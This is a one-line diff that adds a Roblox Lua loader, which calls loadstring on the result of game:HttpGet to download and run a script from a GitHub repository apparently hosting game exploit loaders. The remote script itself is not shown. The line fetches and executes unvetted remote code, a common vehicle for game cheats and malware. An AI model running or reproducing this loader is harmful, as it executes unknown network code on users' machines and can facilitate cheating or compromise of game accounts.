@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/fish-an-anime-rng-spam4-65ka4l8viarc8w.lua"))()
